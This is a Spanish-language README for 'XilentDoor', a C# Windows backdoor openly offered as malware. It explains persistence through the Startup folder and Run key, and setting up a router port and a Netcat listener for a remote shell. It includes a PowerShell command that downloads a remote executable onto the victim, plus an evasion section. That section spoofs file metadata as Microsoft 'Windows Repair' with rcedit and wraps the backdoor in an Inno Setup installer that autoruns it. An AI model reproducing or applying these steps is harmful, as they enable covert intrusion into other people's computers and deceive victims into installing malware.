<p align="center">
  <img src="https://github.com/user-attachments/assets/ac3541ca-952e-4511-a259-764834982f8d" alt="XilentDoor" Logo" />
</p>

<p align="center">
   <a href="https://dotnet.microsoft.com/">
    <img src="https://img.shields.io/badge/C%23-Backdoor-blue.svg">
  </a>
    <img src="https://img.shields.io/badge/Python-Shell-blue.svg">
  </a>
    <img src="https://img.shields.io/badge/Public-%F0%9F%97%9D%EF%B8%8F-blue.svg">
  </a>
</p>

<h1 align="center"></h1>

### Acerca de XilentDoor

XilentDoor es un backdoor escrito en C# orientado a sistemas Windows. Un backdoor es un tipo de malware diseñado para abrir una puerta trasera permanente en el equipo comprometido, permitiendo al atacante acceder y controlar el sistema de forma sigilosa. 

Es parte de la familia <a href="https://github.com/R3LI4NT/XilentLocker">XilentLocker</a>, <a href="https://github.com/R3LI4NT/XilentRAT">XilentRAT</a> y <a href="https://github.com/R3LI4NT/XilentLogger">XilentLogger</a>

<h1 align="center"></h1>

### Características de XilentDoor:

- [x] **Persistencia:** El Backdoor se auto-copia en la ruta `AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` y se agrega al registro Windows `Software\Microsoft\Windows\CurrentVersion\Run`; lo que permite que se ejecute automáticamente cada vez que el sistema se reinicie.
      <img width="1173" height="537" alt="persistence" src="https://github.com/user-attachments/assets/13799961-7f73-4b87-9df8-f82183bc6fa1" />

- [x] **Fingerprinting:** Recopila información básica del sistema donde se ejecuta el backdoor y almacena la información en la ruta `C:\Windows\Temp` bajo el nombre `SystemInfo.txt`. Esta funcionalidad se suele usar para identificar la máquina víctima o confirmar la infección exitosa antes de enviar datos al atacante.
      <img width="603" height="221" alt="2" src="https://github.com/user-attachments/assets/e15ade45-30cc-46a5-ba86-ac91e0acf4a3" />

- [x] **Shell:** Se desarrollo una shell GUI en Python para el backdoor. Puede ser utilizada por otros malwares.
      <img width="1176" height="719" alt="XilentShell" src="https://github.com/user-attachments/assets/d498d58b-dbe7-46f8-8751-03452e41536b" />

- [x] **AutoConnect:** El backdoor se auto-reconecta si pierde la conexión. En el script `Backdoor.cs` se agrega un bucle infinito en el método `Start`. 
      <img width="809" height="264" alt="autoconnect" src="https://github.com/user-attachments/assets/41f5c026-f6c1-4f19-b696-116ddc46d8fe" />
      <img width="690" height="329" alt="autoconnect" src="https://github.com/user-attachments/assets/2b3a0f72-ac2d-4cc4-b8b2-27e68d839df9" />

- [x] **PowerScripts:** Se añadieron <a href="https://github.com/R3LI4NT/XilentDoor/tree/main/PowerScripts">scritps</a> hechos en PowerShell para que pueda deshabilitar procesos y defensas en el sistema remoto. 
      

<h1 align="center"></h1>

### Modo de uso

- (1) Tener instalado el SDK de .NET: https://dotnet.microsoft.com/en-us/download

- (2) Compilar el backdoor con los siguientes comandos:
```
dotnet build -c Release <- el .exe se guarda en XilentDoor\bin\Release\net6.0\XilentDoor.exe
dotnet run <- Ejecuta el Backdoor
```

Con el siguiente comando compilan el Backdoor con todas las dependencias, significa que podrán ejecutar el programa en cualquier directorio:
```
dotnet publish -c Release -r win-x64 --self-contained true /p:PublishSingleFile=true /p:IncludeAllContentForSelfExtract=true
```

- (3) En el método Main (archivo `Program.cs`) modifican la IP y puerto del listener (máquina atacante).
  <img width="815" height="159" alt="3" src="https://github.com/user-attachments/assets/9ba34ae3-382d-4609-a51b-c8bba95610d5" />

<h1 align="center"></h1>

### Backdoor Remoto

Para infectar remotamente un sistema Windows, es necesario configurar un puerto en modo escucha en el router. Esto se puede lograr accediendo al panel de administración del router,  disponible en `http://192.168.1.1`. En la casilla de `LAN Host` es la IP local de la máquina atacante (Kali Linux) y el puerto puede ser aleatorio.

<img width="826" height="386" alt="1" src="https://github.com/user-attachments/assets/f779aa8b-884f-4c88-baed-e8d463f96d59" />

<img width="648" height="258" alt="2" src="https://github.com/user-attachments/assets/23e41c4f-d9e4-4885-a628-061c06f39623" />

En `Program.cs` ingresan su <a href="https://whatismyipaddress.com/es/mi-ip">IP pública</a> y puerto, y compilan el programa a .EXE.

<img width="791" height="154" alt="4" src="https://github.com/user-attachments/assets/9d13e58f-0182-4832-a831-bbd4d7c591ff" />

En la máquina atacante (Kali Linux), configure Netcat para escuchar en el puerto previamente seleccionado. Si el usuario ejecuta el programa, se establecerá una conexión y obtendrá acceso a una shell remota.

<img width="1365" height="720" alt="3" src="https://github.com/user-attachments/assets/79417535-c85e-4d9f-a297-42d18a99921b" />

Una vez usted haya ganado acceso al equipo, podrá utilizar Powershell para ejecutar comandos. Por ejemplo, descargar archivos remotos en el equipo comprometido:
```powershell
powershell -Command "Invoke-WebRequest -Uri 'https://servidor-remoto/Malware.exe' -OutFile 'C:\Windows\Temp\Malware.exe'"
```

<img width="1281" height="572" alt="DownloadFile" src="https://github.com/user-attachments/assets/f9f6bdf3-3a37-4a06-9ce6-27587fd4d1f2" />

<h1 align="center"></h1>

### Evasión Tips

En las pruebas realizadas con el backdoor, los antivirus externos no detectan su presencia. Sin embargo, Microsoft Defender SmartScreen actúa como un filtro reputacional, bloqueando ejecutables nuevos, no firmados o con poca distribución.

<img width="450" height="424" alt="20240712112504846_EN_1" src="https://github.com/user-attachments/assets/e30c4b2a-3309-4ff7-96e4-afefe45fe131" />

Para evadir SmartScreen, podemos firmar el ejecutable con un certificado digital (lo ideal es adquirir un certificado de firma de código, Code Signing Certificate) o bien empaquetar el instalador (.EXE/.MSI) y modificar sus metadatos para reducir su detectabilidad.

Primero debemos de modificar los metadatos y para ello podemos usar herramientas como <a href="https://www.angusj.com/resourcehacker/">Resource Hacker</a> o <a href="https://github.com/electron/rcedit/releases">Recedit</a>.
```
rcedit-x64.exe XilentDoor.exe --set-version-string "CompanyName" "Microsoft Corporation" --set-version-string "ProductName" "Windows Tool" --set-version-string "FileDescription" "Windows Repair" --set-file-version "1.3.5.0" --set-product-version "1.2.5.0" --set-icon "icon.ico"
```

| PARÁMETRO | DESCRIPCIÓN |
| ------------- | ------------- |
| CompanyName | Nombre de la empresa/organización falsa. |
| ProductName | Nombre del producto. |
| FileDescription | Descripción que aparece en el taskmanager (Administrador de Tareas). |
| --set-file-version | Versión técnica del archivo. |
| --set-product-version | Versión del producto general. |
| --set-icon | Icono visual. |

<img width="1362" height="562" alt="evasion-metada" src="https://github.com/user-attachments/assets/c7a9ad56-1281-48d0-abf2-56d03128851a" />

Luego empaquetaremos el .EXE/.MSI en un installer utilizando herramientas como <a href="https://jrsoftware.org/isdl.php">Inno SetUp</a> o <a href="https://nsis.sourceforge.io/Main_Page">NSIS</a>. En mi caso utilizaré Inno, luego de escribir los metadatos del .EXE debemos de crear un script con el nombre `instalador.iss` con el siguiente contenido:
```python
[Setup]
AppName=Windows Tool
AppVersion=1.3.5.0
DefaultDirName={localappdata}\WindowsRepair
DisableProgramGroupPage=yes
OutputDir=.
OutputBaseFilename=installer_windows_tool
Compression=lzma
SolidCompression=yes

[Files]
Source: "C:\Users\Usuario\Desktop\MALWARE\Evasion\XilentDoor.exe"; DestDir: "{app}"; Flags: ignoreversion

[Icons]
Name: "{userstartup}\Windows Repair"; Filename: "{app}\XilentDoor.exe"; IconFilename: "{app}\XilentDoor.exe"

[Run]
Filename: "{app}\XilentDoor.exe"; Description: "Ejecutando Windows Repair..."; Flags: nowait postinstall skipifsilent
```

| PARÁMETRO | DESCRIPCIÓN |
| ------------- | ------------- |
| AppName y AppVersion | Nombre visible del programa falso. |
| DefaultDirName | Instala en AppData\WindowsAudio (poco sospechoso). |
| OutputDir | El .exe del instalador se guardará en el mismo directorio. |
| Files | Copia XilentDoor.exe a la carpeta destino. |
| Icons | Crea una entrada en Inicio → Ejecutar al iniciar sesión. |
| Run | Ejecuta el backdoor automáticamente tras la instalación. |

En el menu de Inno le damos a `Build` **->** `Compile`.

<img width="1365" height="621" alt="evasion-installerSetUp" src="https://github.com/user-attachments/assets/80557abf-d0f2-4046-9469-e441f9e99e22" />

Nos dejará el instalador "legítimo", pero detrás se ejecutará el backdoor y en el Administrador de Tareas aparecerá como una herramienta de reparación de Windows.

<img width="818" height="398" alt="evasion-installerSetUp-2" src="https://github.com/user-attachments/assets/6511756f-cd85-418c-8577-baa644653753" />

<h1 align="center"></h1>

Correo de contacto:

<img src="https://img.shields.io/badge/r3li4nt.contact@keemail.me-D14836?style=for-the-badge&logo=gmail&logoColor=white" />

<h1 align="center"></h1>

> [!CAUTION]
> Cualquier uso indebido de este software será de exclusiva responsabilidad del usuario final, y no del autor. Este proyecto tiene como objetivo inicial demostrar las capacidades de C# como lenguaje para el desarrollo de malware en entornos controlados. 

<h1 align="center"></h1>

#### Developer: ~R3LI4NT~
